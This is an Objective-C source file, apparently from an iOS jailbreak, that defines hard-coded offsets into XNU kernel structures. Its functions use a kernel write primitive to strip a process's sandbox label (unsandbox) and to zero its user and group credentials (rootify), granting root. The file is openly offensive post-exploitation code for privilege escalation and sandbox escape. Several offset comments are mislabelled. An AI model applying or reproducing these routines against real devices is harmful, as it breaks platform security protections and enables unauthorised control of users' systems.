
#include "kernel_utils.h"

#import <Foundation/Foundation.h>
#define LOG(str, args...) do { NSLog(@"[*] " str "\n", ##args); } while(0)

unsigned off_p_pid = 0x10;               // proc_t::p_pid
unsigned off_task = 0x18;                // proc_t::task
unsigned off_p_uid = 0x30;               // proc_t::p_uid
unsigned off_p_gid = 0x34;               // proc_t::p_uid
unsigned off_p_ruid = 0x38;              // proc_t::p_uid
unsigned off_p_rgid = 0x3c;              // proc_t::p_uid
unsigned off_p_ucred = 0x100;            // proc_t::p_ucred
unsigned off_p_csflags = 0x2a8;          // proc_t::p_csflags
unsigned off_p_comm = 0x268;             // proc_t::p_comm
unsigned off_p_textvp = 0x248;           // proc_t::p_textvp
unsigned off_p_textoff = 0x250;          // proc_t::p_textoff
unsigned off_p_cputype = 0x2c0;          // proc_t::p_cputype
unsigned off_p_cpu_subtype = 0x2c4;      // proc_t::p_cpu_subtype

unsigned off_ucred_cr_uid = 0x18;        // ucred::cr_uid
unsigned off_ucred_cr_ruid = 0x1c;       // ucred::cr_ruid
unsigned off_ucred_cr_svuid = 0x20;      // ucred::cr_svuid
unsigned off_ucred_cr_ngroups = 0x24;    // ucred::cr_ngroups
unsigned off_ucred_cr_groups = 0x28;     // ucred::cr_groups
unsigned off_ucred_cr_rgid = 0x68;       // ucred::cr_rgid
unsigned off_ucred_cr_svgid = 0x6c;      // ucred::cr_svgid
unsigned off_ucred_cr_label = 0x78;      // ucred::cr_label

unsigned off_amfi_slot = 0x8;
unsigned off_sandbox_slot = 0x10;

unsigned off_v_type = 0x70;              // vnode::v_type
unsigned off_v_id = 0x74;                // vnode::v_id
unsigned off_v_ubcinfo = 0x78;           // vnode::v_ubcinfo
unsigned off_v_flags = 0x54;             // vnode::v_flags

unsigned off_ubcinfo_csblobs = 0x50;     // ubc_info::csblobs

unsigned off_csb_cputype = 0x8;          // cs_blob::csb_cputype
unsigned off_csb_flags = 0x12;           // cs_blob::csb_flags
unsigned off_csb_base_offset = 0x16;     // cs_blob::csb_base_offset
unsigned off_csb_entitlements_offset = 0x90; // cs_blob::csb_entitlements
unsigned off_csb_signer_type = 0xA0;     // cs_blob::csb_signer_type
unsigned off_csb_platform_binary = 0xA4; // cs_blob::csb_platform_binary
unsigned off_csb_platform_path = 0xA8;   // cs_blob::csb_platform_path
unsigned off_csb_cd = 0x80;              // cs_blob::csb_cd

unsigned off_t_flags = 0x3a0; // task::t_flags

unsigned off_v_mount = 0xd8;             // vnode::v_mount
unsigned off_v_specinfo = 0x78;          // vnode::v_specinfo
unsigned off_specflags = 0x10;
unsigned off_mnt_flag = 0x70;            // mount::mnt_flag
unsigned off_mnt_data = 0x8f8;           // mount::mnt_data

uint64_t unsandbox(pid_t pid) {
    if (!pid) return -1;
    
    LOG("[*] Unsandboxing pid %d\n", pid);
    
    uint64_t proc = proc_of_pid(pid); // pid's proccess structure on the kernel
    uint64_t ucred = KernelRead_64bits(proc + off_p_ucred); // pid credentials
    uint64_t cr_label = KernelRead_64bits(ucred + off_ucred_cr_label); // MAC label
    uint64_t orig_sb = KernelRead_64bits(cr_label + off_sandbox_slot);
    
    KernelWrite_64bits(cr_label + off_sandbox_slot /* First slot is AMFI's. so, this is second? */, 0); //get rid of sandbox by nullifying it
    
    return (KernelRead_64bits(KernelRead_64bits(ucred + off_ucred_cr_label) + off_sandbox_slot) == 0) ? orig_sb : -1;
}

int sandbox(pid_t pid, uint64_t sb) {
    if (!pid) return -1;
    
    LOG("[*] Sandboxing pid %d with slot at 0x%llx\n", pid, sb);
    
    uint64_t proc = proc_of_pid(pid); // pid's proccess structure on the kernel
    uint64_t ucred = KernelRead_64bits(proc + off_p_ucred); // pid credentials
    uint64_t cr_label = KernelRead_64bits(ucred + off_ucred_cr_label /* MAC label */);
    KernelWrite_64bits(cr_label + off_sandbox_slot /* First slot is AMFI's. so, this is second? */, sb);
    
    return (KernelRead_64bits(KernelRead_64bits(ucred + off_ucred_cr_label) + off_sandbox_slot) == sb) ? 0 : -1;
}

int rootify(pid_t pid) {
    if (!pid) return -1;
    
    uint64_t proc = proc_of_pid(pid);
    uint64_t ucred = KernelRead_64bits(proc + off_p_ucred);
    //make everything 0 without setuid(0), pretty straightforward.
    KernelWrite_32bits(proc + off_p_uid, 0);
    KernelWrite_32bits(proc + off_p_ruid, 0);
    KernelWrite_32bits(proc + off_p_gid, 0);
    KernelWrite_32bits(proc + off_p_rgid, 0);
    KernelWrite_32bits(ucred + off_ucred_cr_uid, 0);
    KernelWrite_32bits(ucred + off_ucred_cr_ruid, 0);
    KernelWrite_32bits(ucred + off_ucred_cr_svuid, 0);
    KernelWrite_32bits(ucred + off_ucred_cr_ngroups, 1);
    KernelWrite_32bits(ucred + off_ucred_cr_groups, 0);
    KernelWrite_32bits(ucred + off_ucred_cr_rgid, 0);
    KernelWrite_32bits(ucred + off_ucred_cr_svgid, 0);
    
    return (KernelRead_32bits(proc + off_p_uid) == 0) ? 0 : -1;
}


